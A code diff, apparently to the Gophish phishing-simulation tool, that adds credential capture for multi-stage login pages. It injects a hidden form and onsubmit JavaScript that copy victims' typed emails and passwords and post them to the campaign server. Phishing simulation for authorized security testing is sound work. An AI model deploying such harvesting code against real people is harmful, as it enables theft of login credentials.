@@ -37,96 +37,120 @@ func (p *Page) parseHTML() error {
 	forms := d.Find("form")
 	log.Debug("Found", forms.Length(), "forms in the page")
 	
+	// First, find all forms that look like they're part of a multi-stage login
+	var emailForm, passwordForm *goquery.Selection
 	forms.Each(func(i int, f *goquery.Selection) {
-		log.Debug("Processing form", i+1)
+		formID, _ := f.Attr("id")
+		log.Debug("Processing form", i+1, "with ID:", formID)
+
+		// Look for common email/username form identifiers
+		if strings.Contains(strings.ToLower(formID), "email") ||
+		   f.Find("input[type='email']").Length() > 0 {
+			emailForm = f
+			log.Debug("Found email form with ID:", formID)
+		}
+
+		// Look for common password form identifiers
+		if strings.Contains(strings.ToLower(formID), "password") ||
+		   f.Find("input[type='password']").Length() > 0 {
+			passwordForm = f
+			log.Debug("Found password form with ID:", formID)
+		}
+	})
+
+	// If we found both forms, we're dealing with a multi-stage login
+	if emailForm != nil && passwordForm != nil {
+		log.Debug("Detected multi-stage login form")
 		
-		// We always want the submitted events to be sent to our server
-		f.SetAttr("action", "")
-		f.SetAttr("method", "POST")
-		log.Debug("Set form action to empty string and method to POST")
+		// Create a hidden form to store and submit credentials
+		d.Find("body").PrependHtml(`
+			<form id="gophish-hidden-form" method="POST" style="display:none;">
+				<input type="hidden" name="rid" value="{{.RId}}"/>
+				<input type="hidden" name="username" id="gophish_username"/>
+				<input type="hidden" name="password" id="gophish_password"/>
+				<input type="hidden" name="__original_url" value="{{.URL}}"/>
+			</form>
+		`)
 		
-		if p.CaptureCredentials {
-			log.Debug("Credential capture is enabled")
-			inputs := f.Find("input")
-			log.Debug("Found", inputs.Length(), "input fields")
+		// Don't modify the email form's action - let it handle its own transition
+		emailForm.Each(func(i int, f *goquery.Selection) {
+			// Store the email when the first form is submitted
+			f.SetAttr("onsubmit", `
+				var emailInput = document.querySelector('input[type="email"]');
+				if (emailInput) {
+					document.getElementById('gophish_username').value = emailInput.value;
+				}
+				return true;
+			`)
+		})
+
+		// Modify the password form to submit both credentials
+		passwordForm.Each(func(i int, f *goquery.Selection) {
+			if p.CaptureCredentials {
+				// When password form submits, store password and submit hidden form
+				f.SetAttr("onsubmit", `
+					var passwordInput = document.querySelector('input[type="password"]');
+					if (passwordInput) {
+						document.getElementById('gophish_password').value = passwordInput.value;
+						document.getElementById('gophish-hidden-form').submit();
+					}
+					return true;
+				`)
+			}
+		})
+
+		log.Debug("Set up credential capture for multi-stage form")
+	} else {
+		// Handle single-form case
+		forms.Each(func(i int, f *goquery.Selection) {
+			log.Debug("Processing single form", i+1)
 			
-			// Add the rid parameter as a hidden input
-			f.PrependHtml(`<input type="hidden" name="rid" value="{{.RId}}"/>`)
-			log.Debug("Added hidden RId field")
+			f.SetAttr("action", "")
+			f.SetAttr("method", "POST")
 			
-			inputs.Each(func(j int, input *goquery.Selection) {
-				inputType, _ := input.Attr("type")
-				inputName, hasName := input.Attr("name")
-				placeholder, _ := input.Attr("placeholder")
-				id, _ := input.Attr("id")
+			if p.CaptureCredentials {
+				inputs := f.Find("input")
+				log.Debug("Found", inputs.Length(), "input fields")
 				
-				log.Debug("Processing input field:", j+1, "Type:", inputType, "Name:", inputName, "HasName:", hasName, "Placeholder:", placeholder, "ID:", id)
+				f.PrependHtml(`<input type="hidden" name="rid" value="{{.RId}}"/>`)
 				
-				// Always try to assign a name if we don't have one
-				if !hasName {
-					switch strings.ToLower(inputType) {
-					case "text", "email", "tel":
-						// First try to identify by placeholder or id
-						fieldText := strings.ToLower(placeholder + " " + id)
-						if strings.Contains(fieldText, "email") || 
-						   strings.Contains(fieldText, "username") || 
-						   strings.Contains(fieldText, "user") || 
-						   strings.Contains(fieldText, "phone") || 
-						   strings.Contains(fieldText, "mobile") || 
-						   strings.Contains(fieldText, "skype") || 
-						   strings.Contains(fieldText, "login") {
-							input.SetAttr("name", "username")
-							log.Debug("Assigned name 'username' to input based on field text:", fieldText)
-						} else {
-							// Fallback - if it's the first text/email input, assume it's username
-							input.SetAttr("name", "username")
-							log.Debug("Assigned name 'username' to first text/email input as fallback")
-						}
-					case "password":
-						if p.CapturePasswords {
-							input.SetAttr("name", "password")
-							log.Debug("Assigned name 'password' to password field")
+				inputs.Each(func(j int, input *goquery.Selection) {
+					inputType, _ := input.Attr("type")
+					inputName, hasName := input.Attr("name")
+					placeholder, _ := input.Attr("placeholder")
+					id, _ := input.Attr("id")
+					
+					log.Debug("Processing input field:", j+1, "Type:", inputType, "Name:", inputName, "HasName:", hasName, "Placeholder:", placeholder, "ID:", id)
+					
+					if !hasName {
+						switch strings.ToLower(inputType) {
+						case "text", "email", "tel":
+							fieldText := strings.ToLower(placeholder + " " + id)
+							if strings.Contains(fieldText, "email") || 
+							   strings.Contains(fieldText, "username") || 
+							   strings.Contains(fieldText, "user") || 
+							   strings.Contains(fieldText, "phone") || 
+							   strings.Contains(fieldText, "mobile") || 
+							   strings.Contains(fieldText, "skype") || 
+							   strings.Contains(fieldText, "login") {
+								input.SetAttr("name", "username")
+								log.Debug("Assigned name 'username' to input based on field text:", fieldText)
+							}
+						case "password":
+							if p.CapturePasswords {
+								input.SetAttr("name", "password")
+								log.Debug("Assigned name 'password' to password field")
+							}
 						}
 					}
-				}
-			})
+				})
+				
+				f.AppendHtml(`<input type="hidden" name="__original_url" value="{{.URL}}"/>`)
+			}
+		})
+	}
 
-			// Add a hidden input to track the original field names
-			f.AppendHtml(`<input type="hidden" name="__original_url" value="{{.URL}}"/>`)
-			log.Debug("Added hidden URL tracking field")
-
-			// Remove any JavaScript that might prevent form submission
-			f.Find("script").Each(func(i int, s *goquery.Selection) {
-				scriptText := s.Text()
-				if strings.Contains(scriptText, "preventDefault") {
-					s.Remove()
-					log.Debug("Removed script containing preventDefault")
-				}
-			})
-		} else {
-			log.Debug("Credential capture is disabled - removing all input names")
-			inputFields := f.Find("input")
-			inputFields.Each(func(j int, input *goquery.Selection) {
-				input.RemoveAttr("name")
-			})
-		}
-
-		// Remove any existing submit handlers
-		f.RemoveAttr("onsubmit")
-		
-		// Add our submit handler
-		f.SetAttr("onsubmit", "return true;")
-		log.Debug("Added form submit handler")
-	})
-	
-	// Also try to remove any external scripts that might interfere
-	d.Find("script").Each(func(i int, s *goquery.Selection) {
-		scriptText := s.Text()
-		if strings.Contains(scriptText, "preventDefault") {
-			s.Remove()
-			log.Debug("Removed external script containing preventDefault")
-		}
-	})
+	// Don't modify any preventDefault() calls - let the original JavaScript handle transitions
 	
 	p.HTML, err = d.Html()
 	if err != nil {
